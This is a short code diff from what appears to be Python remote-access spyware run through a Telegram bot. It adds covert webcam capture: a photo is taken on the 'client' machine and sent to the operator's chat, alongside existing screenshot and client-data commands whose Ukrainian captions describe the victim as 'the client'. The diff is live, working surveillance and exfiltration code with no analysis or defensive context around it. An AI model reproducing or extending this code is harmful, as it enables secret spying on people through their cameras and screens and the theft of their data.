@@ -187,6 +187,8 @@ def main():
                 bot.send_photo(get_chat_id(upd), uphoto)
                 uphoto.close()
                 os.remove("photo.png")
+                send_message(get_chat_id(upd),
+                             "Фото з камери клієнта:")
             elif get_message_text(upd).lower() == "/infotxt":
                 send_message(get_chat_id(upd),
                              "Всі дані про клієнта в .txt форматі:")
@@ -256,6 +258,18 @@ def main():
                 bot.send_photo(get_chat_id(upd), uphoto, text)
                 uphoto.close()
                 os.remove("screenshot_pyautogui.png")
+                cap = cv2.VideoCapture(0)
+                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
+                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
+                ret, frame = cap.read()
+                cv2.imwrite('photo.png', frame)
+                cap.release()
+                uphoto = open("photo.png", "rb")
+                bot.send_photo(get_chat_id(upd), uphoto)
+                uphoto.close()
+                os.remove("photo.png")
+                send_message(get_chat_id(upd),
+                             "Фото з камери клієнта:")
             elif get_message_text(upd).lower() == "/data":
                 send_message(get_chat_id(upd),
                              f"База даних запитів з пристрою клієнта:")
